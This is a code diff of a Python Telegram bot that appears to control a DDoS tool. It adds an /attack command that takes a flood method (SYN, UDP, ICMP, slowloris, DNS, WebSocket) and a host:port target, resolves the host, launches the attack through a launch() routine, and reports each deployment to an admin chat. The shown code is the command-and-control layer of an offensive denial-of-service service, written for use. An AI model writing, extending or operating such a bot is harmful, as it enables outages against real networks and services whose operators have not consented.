@@ -407,56 +407,65 @@ def cmd_active(message):
                      parse_mode="Markdown")
 
 
-@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
-def execute_attack(message):
+@bot.message_handler(commands=["attack"])
+def cmd_attack(message):
     if not is_admin(message):
         return
-    chat_id = message.chat.id
-    raw = message.text.strip()
+    parts = message.text.split(maxsplit=2)
+    if len(parts) < 3:
+        bot.reply_to(message,
+            "usage: /attack <method> <target>\n"
+            "methods: syn | udp | icmp | slowloris | dns | ws\n"
+            "example: /attack udp 1.2.3.4:32002")
+        return
+
+    method_name = parts[1].lower()
+    raw_target = parts[2].strip()
+
+    # map name → id
+    name_to_id = {
+        "syn": "1", "udp": "2", "slowloris": "3",
+        "icmp": "4", "dns": "5", "ws": "6",
+    }
+    method_id = name_to_id.get(method_name)
+    if not method_id:
+        bot.reply_to(message, f"unknown method: {method_name}")
+        return
+
+    # parse host:port
+    port = None
+    target = raw_target
+    if ":" in raw_target:
+        host_part, port_part = raw_target.rsplit(":", 1)
+        try:
+            port = int(port_part)
+            target = host_part
+        except ValueError:
+            pass
 
     try:
-        # parse optional host:port
-        port = None
-        target = raw
-        if ":" in raw:
-            host_part, port_part = raw.rsplit(":", 1)
-            try:
-                port = int(port_part)
-                target = host_part
-            except ValueError:
-                pass
-
-        # resolve hostname if needed
-        if is_valid_ip(target):
-            ip = target
-        else:
-            ip = socket.gethostbyname(target)
-
-        method_id = user_attacks[chat_id]["method"]
-        label = ATTACK_METHODS[method_id]
-        target_str = f"{ip}:{port}" if port else ip
-
-        bot.send_message(chat_id, f"🚀 LAUNCHING {label} AT {target_str}")
-
-        # launch
-        key, err = launch(method_id, ip, port, 50, chat_id)
-        if err:
-            bot.send_message(chat_id, f"error: {err}")
-            return
-
-        bot.send_message(
-            ADMIN_CHAT_ID,
-            f"☠️ ATTACK DEPLOYED ☠️\n"
-            f"Method: {label}\n"
-            f"Target: {target_str}\n"
-            f"Key: {key}\n"
-            f"Origin: {message.from_user.id}",
-        )
-
+        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
     except Exception as e:
-        bot.send_message(chat_id, f"💥 ERROR: {str(e)}")
-        print(f"Attack Error: {str(e)}", file=sys.stderr)
+        bot.reply_to(message, f"resolve failed: {e}")
+        return
 
+    label = ATTACK_METHODS[method_id]
+    target_str = f"{ip}:{port}" if port else ip
+
+    bot.send_message(message.chat.id, f"🚀 LAUNCHING {label} AT {target_str}")
+
+    key, err = launch(method_id, ip, port, 50, message.chat.id)
+    if err:
+        bot.send_message(message.chat.id, f"error: {err}")
+        return
+
+    bot.send_message(
+        ADMIN_CHAT_ID,
+        f"☠️ ATTACK DEPLOYED ☠️\n"
+        f"Method: {label}\n"
+        f"Target: {target_str}\n"
+        f"Key: {key}",
+        )
 
 # ─────────────────────────────────────────────────────────────
 # ENTRY
